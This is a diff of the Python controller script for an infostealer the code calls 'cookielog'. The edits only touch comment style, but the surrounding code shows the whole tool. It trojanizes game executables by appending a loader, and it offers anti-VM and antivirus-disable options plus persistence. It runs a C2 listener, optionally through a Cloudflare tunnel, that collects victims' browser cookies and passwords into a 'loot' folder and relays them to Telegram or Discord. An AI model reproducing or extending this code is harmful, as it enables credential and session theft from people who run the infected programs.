@@ -59,7 +59,7 @@ HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
 LOADER = os.path.join(BIN, "loader.exe")
 DLL    = os.path.join(BIN, "ckdll.dll")
-CKDEC  = os.path.join(BIN, "ckdec.exe")     # embedded in loader.exe at build time
+CKDEC  = os.path.join(BIN, "ckdec.exe")     # Embedded in loader.exe at build time
 LOOT   = os.path.join(HERE, "loot")
 IFEC   = os.path.join(HERE, "ifec")
 IFEC_FOLDS = os.path.join(IFEC, "folds")
@@ -77,7 +77,7 @@ AV_DISABLE  = stage.AV_DISABLE
 def log(msg):
     print(msg, flush=True)
 
-# ------------------------------------------------------------------ config persistence
+# ------------------------------------------------------------------ Config persistence
 # config.json stores telegram token, discord webhook, default port, and persist flag.
 # When --telegram / --discord is passed via CLI, it's saved automatically.
 # When no flag is passed, saved values are loaded from config.json.
@@ -156,7 +156,7 @@ def show_config():
     else:
         tg = cfg.get("telegram", "")
         if tg:
-            # Show bot token partially masked + chat ID
+            # Show bot token partially masked + chat ID.
             parts = tg.rsplit(":", 1)
             if len(parts) == 2:
                 bot, chat = parts
@@ -168,7 +168,7 @@ def show_config():
             log("  Telegram:  (not set)")
         dc = cfg.get("discord", "")
         if dc:
-            # Mask the webhook token part
+            # Mask the webhook token part.
             masked = dc[:50] + "..." if len(dc) > 50 else dc
             log("  Discord:   %s" % masked)
         else:
@@ -186,7 +186,7 @@ def tg_lookup_chatid(bot_token):
         resp = urllib.request.urlopen(req, timeout=10)
         data = json.loads(resp.read().decode("utf-8"))
         if data.get("ok") and data.get("result"):
-            # Get the last message's chat ID
+            # Get the last message's chat ID.
             last = data["result"][-1]
             chat_id = last["message"]["chat"]["id"]
             return str(chat_id)
@@ -234,7 +234,7 @@ def detect_public_ip(timeout=5):
         req = urllib.request.Request("https://api.ipify.org")
         resp = urllib.request.urlopen(req, timeout=timeout)
         ip = resp.read().decode("utf-8", "replace").strip()
-        # Basic validation: must look like an IP
+        # Basic validation: must look like an IP.
         parts = ip.split(".")
         if len(parts) == 4 and all(p.isdigit() for p in parts):
             return ip
@@ -252,7 +252,7 @@ def find_best_port(start=9400, end=9500, preferred=None):
     without SO_REUSEADDR (so ports already in LISTEN state are correctly
     detected as occupied on Windows).
     """
-    # Try preferred port first (e.g. the saved config port)
+    # Try preferred port first (e.g. the saved config port).
     if preferred:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -260,7 +260,7 @@ def find_best_port(start=9400, end=9500, preferred=None):
             s.close()
             return preferred
         except (OSError, socket.error):
-            pass  # preferred is taken, scan the range
+            pass  # Preferred is taken, scan the range
 
     for p in range(start, end + 1):
         try:
@@ -279,7 +279,7 @@ def ensure_build():
         return True
     if sys.platform != "win32":
         # MSVC + build.bat are Windows-only: on Linux the attacker machine uses the
-        # prebuilt binaries shipped in bin/ (infection itself is a byte append)
+        # prebuilt binaries shipped in bin/ (infection itself is a byte append).
         log("[-] no prebuilt binaries in bin/ and compilation needs Windows (MSVC)")
         log("    copy bin/loader.exe + bin/ckdll.dll + bin/ckdec.exe from a Windows build machine")
         return False
@@ -307,7 +307,7 @@ def ensure_build():
     log("[-] build succeeded but binaries not found")
     return False
 
-# ------------------------------------------------------------------ exe finding
+# ------------------------------------------------------------------ EXE finding
 
 def find_main_exe(folder):
     """Find the main .exe in a folder.
@@ -317,7 +317,7 @@ def find_main_exe(folder):
     """
     exes = []
     for root, dirs, files in os.walk(folder):
-        # skip subfolders that are clearly not the main exe location
+        # Skip subfolders that are clearly not the main exe location.
         for f in files:
             if f.lower().endswith(".exe"):
                 exes.append(os.path.join(root, f))
@@ -326,7 +326,7 @@ def find_main_exe(folder):
     if len(exes) == 1:
         return exes[0], os.path.basename(exes[0])
 
-    # Try to match <name>_Data/ pattern (Unity games)
+    # Try to match <name>_Data/ pattern (Unity games).
     for exe_path in exes:
         exe_name = os.path.basename(exe_path)
         stem = os.path.splitext(exe_name)[0]
@@ -334,7 +334,7 @@ def find_main_exe(folder):
         if os.path.isdir(data_dir):
             return exe_path, exe_name
 
-    # Fallback: largest .exe (skip known helper exes)
+    # Fallback: largest .exe (skip known helper exes).
     skip = ("unitycrashhandler", "crashpad_handler", "setup", "uninstall",
             "updater", "helper", "crashpad")
     candidates = [e for e in exes
@@ -399,7 +399,7 @@ def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
     folder_name = os.path.basename(os.path.abspath(host_dir))
     dest_folder = os.path.join(IFEC_FOLDS, folder_name)
 
-    # if destination already exists, remove it (fresh copy)
+    # If destination already exists, remove it (fresh copy).
     if os.path.exists(dest_folder):
         log("[*] removing old copy: ifec/folds/%s/" % folder_name)
         shutil.rmtree(dest_folder, ignore_errors=True)
@@ -410,7 +410,7 @@ def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
         sum(os.path.getsize(os.path.join(r,f))
             for r,_,fs in os.walk(dest_folder) for f in fs) / 1048576))
 
-    # infect the exe in place: overwrite the copy with the infected version
+    # Infect the exe in place: overwrite the copy with the infected version.
     dest_exe = os.path.join(dest_folder, os.path.relpath(exe_path, host_dir))
     infected = build_infected_bytes(exe_path, c2_url, persist, no_anti_vm)
     with open(dest_exe, "wb") as f:
@@ -496,15 +496,15 @@ def start_listener(port, telegram=None, discord=None, tunnel=False):
     loopback-only and never need an inbound firewall rule."""
     os.makedirs(LOOT, exist_ok=True)
     bind = "127.0.0.1" if tunnel else "0.0.0.0"
-    # refuse to start twice: a zombie listener from a previous run kept the port,
-    # the new listener died with EADDRINUSE and every victim POST was lost
+    # Refuse to start twice: a zombie listener from a previous run kept the port,
+    # the new listener died with EADDRINUSE and every victim POST was lost.
     try:
         probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         probe.bind((bind, port))
         probe.close()
     except OSError:
-        # port busy: if it is OUR zombie listener from a previous crashed run,
-        # kill it and continue; if it belongs to someone else, refuse cleanly
+        # Port busy: if it is OUR zombie listener from a previous crashed run,
+        # kill it and continue; if it belongs to someone else, refuse cleanly.
         pid, cl = find_port_owner_pid(port)
         if pid and cl and "listen.py" in cl:
             log("[!] port %d held by our old listener (PID=%d) -- killing it and restarting" % (port, pid))
@@ -535,7 +535,7 @@ def start_listener(port, telegram=None, discord=None, tunnel=False):
     old = ["all_cookies.json", "all_cookies.txt",
            "passwords.json", "passwords.txt",
            "session_cookies.json", "session_cookies.txt",
-           "cookies.json", "cookies.txt",  # legacy names
+           "cookies.json", "cookies.txt",  # Legacy names
            "listener.log"]
     present = [f for f in old if os.path.exists(os.path.join(LOOT, f))]
     if present:
@@ -562,7 +562,7 @@ def start_listener(port, telegram=None, discord=None, tunnel=False):
     else:
         kwargs["start_new_session"] = True
     proc = subprocess.Popen(cmd, cwd=HERE, **kwargs)
-    # wait for the socket to accept, not just for the process to exist
+    # Wait for the socket to accept, not just for the process to exist.
     for _ in range(20):
         if proc.poll() is not None:
             log("[-] listener failed to start (exit %d)" % proc.returncode)
@@ -611,7 +611,7 @@ def _remote_tls_c2(c2_url, run_local):
     return _remote_c2(c2_url, run_local)
 
 
-# ------------------------------------------------------------------ tunnel C2
+# ------------------------------------------------------------------ Tunnel C2
 # A quick tunnel gives the payload a real https endpoint on a CA-signed host
 # with no VPS, no domain and no inbound port -- the two things a CGNAT line
 # cannot provide. cloudflared dials out, terminates TLS at Cloudflare's edge and
@@ -753,7 +753,7 @@ def wait_for_cookies(timeout=300):
                         except Exception:
                             pass
                         log("    -> %s (%d session cookies)" % (sess_path, sess_count))
-                    # top domains
+                    # Top domains
                     top = {}
                     for c in data:
                         d = c.get("domain", "?")
@@ -771,7 +771,7 @@ def wait_for_cookies(timeout=300):
     log("    fallback on the target: C:\\ProgramData\\MediaCache\\cache.json")
     return False
 
-# ------------------------------------------------------------------ local test run
+# ------------------------------------------------------------------ Local test run
 
 def run_infected_locally(host_path, infected_path, is_folder=False):
     """Run the infected exe locally for testing.
@@ -792,7 +792,7 @@ def run_infected_locally(host_path, infected_path, is_folder=False):
         _wait_and_cleanup(proc, infected_path, os.path.basename(infected_path))
         return
 
-    # Standalone mode: backup original, copy infected over, run, restore
+    # Standalone mode: backup original, copy infected over, run, restore.
     backup = host_path + ".orig"
     shutil.copy2(host_path, backup)
     log("[+] backed up original: %s" % backup)
@@ -830,7 +830,7 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
     else:
         log("[*] loader exited (code=%s)" % proc.returncode)
 
-    # kill the game process — it holds the file lock on host_path
+    # Kill the game process -- it holds the file lock on host_path.
     log("[*] killing game process (%s)..." % exe_name)
     try:
         subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
@@ -840,7 +840,7 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
 
     time.sleep(2)
 
-    # restore original (standalone mode only)
+    # Restore original (standalone mode only).
     if backup:
         for attempt in range(5):
             try:
@@ -862,7 +862,7 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
                     log("    backup at: %s" % backup)
                     log("    restore manually: copy /b \"%s\" \"%s\"" % (backup, host_path))
 
-    # clean up temp file from rename-restore
+    # Clean up temp file from rename-restore.
     wdir = os.path.dirname(host_path)
     bak_tmp = os.path.join(wdir, "~ck_bak.bin")
     if os.path.exists(bak_tmp):
@@ -1128,7 +1128,7 @@ def pick_gui(default_tunnel=False):
         ttk.Button(target, text="Select .exe and run (test)",
                    command=do_file_run).grid(row=1, column=1, sticky="ew", padx=(4, 0))
 
-        # --- c2 / transport ----------------------------------------------
+        # --- C2 / transport ----------------------------------------------
         c2 = ttk.LabelFrame(root, text="C2 and transport", padding=(10, 8, 10, 10))
         c2.pack(fill="x", padx=12, pady=(0, 8))
 
@@ -1193,7 +1193,7 @@ def pick_gui(default_tunnel=False):
         ttk.Checkbutton(opts, text="Disable anti-VM checks (VM targets only)",
                         variable=avm_var).pack(side="left", padx=(18, 0))
 
-        # --- status + footer ---------------------------------------------
+        # --- Status + footer ---------------------------------------------
         status_lbl = ttk.Label(root, text="", foreground=INFO)
         status_lbl.pack(fill="x", padx=12, pady=(0, 6))
 
@@ -1202,7 +1202,7 @@ def pick_gui(default_tunnel=False):
         footer.pack(fill="x")
         ttk.Button(footer, text="Cancel", command=root.destroy).pack(side="right")
 
-        # --- live status --------------------------------------------------
+        # --- Live status --------------------------------------------------
         def _relay_state(label, var, enabled):
             if enabled.get() and var.get().strip():
                 label.config(text="active", foreground=OK)
@@ -1236,7 +1236,7 @@ def pick_gui(default_tunnel=False):
         log("[!] GUI not available (%s)" % ex)
         return None, None, False, None, None, False, None, False, False
 
-# ------------------------------------------------------------------ interactive terminal
+# ------------------------------------------------------------------ Interactive terminal
 
 def print_help():
     """Print all available commands."""
@@ -1421,7 +1421,7 @@ def interactive_loop():
                 subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)
 
         elif cmd == "test-listener":
-            # Start listener on a test port and send fake cookies
+            # Start listener on a test port and send fake cookies.
             test_port = port
             log("[*] starting listener on port %d for test..." % test_port)
             listener = start_listener(test_port, telegram, discord)
@@ -1437,7 +1437,7 @@ def interactive_loop():
                                  headers={"Content-Type": "application/json"})
                 resp = ur.urlopen(req, timeout=5)
                 log("[+] listener test: HTTP %d %s" % (resp.status, resp.read().decode()))
-                # Check if loot was written
+                # Check if loot was written.
                 jp = os.path.join(LOOT, "all_cookies.json")
                 if not os.path.exists(jp):
                     jp = os.path.join(LOOT, "cookies_all.json")
@@ -1471,12 +1471,12 @@ def interactive_loop():
             log("  (clear removes from config.json; to re-enable, re-enter the key)")
 
         elif cmd == "gui":
-            # Launch GUI picker, then run the full flow
+            # Launch GUI picker, then run the full flow.
             host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm, gui_tunnel = pick_gui()
             if not host_path:
                 log("[-] nothing selected")
                 continue
-            # GUI values are authoritative (None = relay disabled by checkbox)
+            # GUI values are authoritative (None = relay disabled by checkbox).
             telegram = gui_tg
             discord = gui_dc
             persist = gui_persist
@@ -1508,7 +1508,7 @@ def interactive_loop():
             sub = rest.split()
             host_path = ""
             run_flag = False
-            persist_flag = persist  # inherit current
+            persist_flag = persist  # Inherit current
             j = 0
             while j < len(sub):
                 if sub[j] == "--run":
@@ -1548,13 +1548,13 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
     log("  cookielog -- infecting %s" % os.path.basename(host_path))
     log("=" * 60)
 
-    # 1. ensure binaries
+    # 1. Ensure binaries
     log("\n[1/5] checking binaries...")
     if not ensure_build():
         log("[-] cannot continue without binaries")
         return
 
-    # 2. detect IP
+    # 2. Detect IP
     log("\n[2/5] detecting attacker IP...")
     if c2_override and not tunnel:
         try:
@@ -1649,7 +1649,7 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
             listener.terminate()
         return
 
-    # 5. run locally or wait
+    # 5. Run locally or wait
     if run_local:
         try:
             if mode == "folder":
@@ -1665,7 +1665,7 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
                     os.remove(backup)
                     log("[+] original .exe restored after error")
 
-    # 6. wait for cookies
+    # 6. Wait for cookies
     if remote_c2:
         log("[*] staged for %s; loot lands on the C2 host (rsync from there)" % c2_url)
         return
@@ -1702,7 +1702,7 @@ def main():
         elif choice == "3":
             log("[*] pass args: python auto.py <path> [--run] [--persist] [--telegram ...] [--discord ...]")
             return 0
-        # default: GUI mode (fall through)
+        # default: GUI mode (fall through).
 
     port = 9090
     port_explicit = False
@@ -1719,7 +1719,7 @@ def main():
     find_port = False
     tunnel = False
 
-    # parse args
+    # Parse args
     args = sys.argv[1:]
     i = 0
     while i < len(args):
@@ -1751,7 +1751,7 @@ def main():
         elif a == "--clear-discord":
             clear_dc = True; i += 1
         elif not a.startswith("--"):
-            # join remaining non-flag args as the host path (handles spaces)
+            # Join remaining non-flag args as the host path (handles spaces).
             parts = []
             while i < len(args) and not args[i].startswith("--"):
                 parts.append(args[i]); i += 1
@@ -1776,7 +1776,7 @@ def main():
         save_config(cfg)
         return 0
 
-    # Load saved config for values not passed via CLI
+    # Load saved config for values not passed via CLI.
     cfg = load_config()
     if telegram is None and cfg.get("telegram"):
         telegram = cfg["telegram"]
@@ -1823,11 +1823,11 @@ def main():
         else:
             log("[-] no free port found in range 9400-9500, using %d" % port)
 
-    # the URL is the source of truth for the port the payload dials
+    # The URL is the source of truth for the port the payload dials.
     if c2_override:
         port = port_from_url(c2_override, port)
 
-    # Save new values to config if provided via CLI
+    # Save new values to config if provided via CLI.
     cfg_new = load_config()
     changed = False
     if telegram and telegram != cfg_new.get("telegram"):
@@ -1850,13 +1850,13 @@ def main():
     log("  cookielog -- automatic payload setup")
     log("=" * 60)
 
-    # 1. ensure binaries
+    # 1. Ensure binaries
     log("\n[1/5] checking binaries...")
     if not ensure_build():
         log("[-] cannot continue without binaries")
         return 1
 
-    # 2. detect IP + build C2 URL
+    # 2. Detect IP + build C2 URL
     log("\n[2/5] detecting attacker IP...")
     ip = None
     if c2_override:
@@ -1893,7 +1893,7 @@ def main():
         c2_url = "http://127.0.0.1:%d/" % port
         log("[+] C2 URL (local test): %s" % c2_url)
 
-    # 3. get target (file or folder)
+    # 3. Get target (file or folder)
     log("\n[3/5] selecting target...")
     if host_arg:
         host_path = host_arg
@@ -1937,12 +1937,12 @@ def main():
                 return 1
             port = info["port"]
             c2_url = info["url"]
-            c2_override = info["url"]  # prevent detect_ip from overwriting
+            c2_override = info["url"]  # Prevent detect_ip from overwriting
             cfg["port"] = port
             save_config(cfg)
         if gui_avm:
             no_anti_vm = True
-        # GUI values are authoritative — if the user unchecked a relay
+        # GUI values are authoritative -- if the user unchecked a relay
         # checkbox, gui_tg/gui_dc will be None, and we must NOT fall back
         # to the config value. The GUI already saved keys to config; the
         # checkbox controls whether the relay is USED for this run.
@@ -2054,7 +2054,7 @@ def main():
             listener.terminate()
         return 1
 
-    # 6. run locally or wait for cookies
+    # 6. Run locally or wait for cookies
     if run_local:
         try:
             if mode == "folder":
@@ -2070,7 +2070,7 @@ def main():
                     os.remove(backup)
                     log("[+] original .exe restored after error")
 
-    # 7. wait for cookies
+    # 7. Wait for cookies
     if remote_c2:
         log("[*] staged for %s; loot lands on the C2 host (rsync from there)" % c2_url)
         return 0
@@ -2078,8 +2078,8 @@ def main():
         wait_for_cookies(timeout=300)
     except KeyboardInterrupt:
         log("\n[*] interrupted by user")
-    # keep the listener alive: victims often run the exe minutes or hours later,
-    # terminating it here silently dropped every late delivery
+    # Keep the listener alive: victims often run the exe minutes or hours later,
+    # terminating it here silently dropped every late delivery.
     if listener.poll() is None:
         log("[*] listener still running on port %d -- leave it up for late victims (close its window to stop)" % port)
 
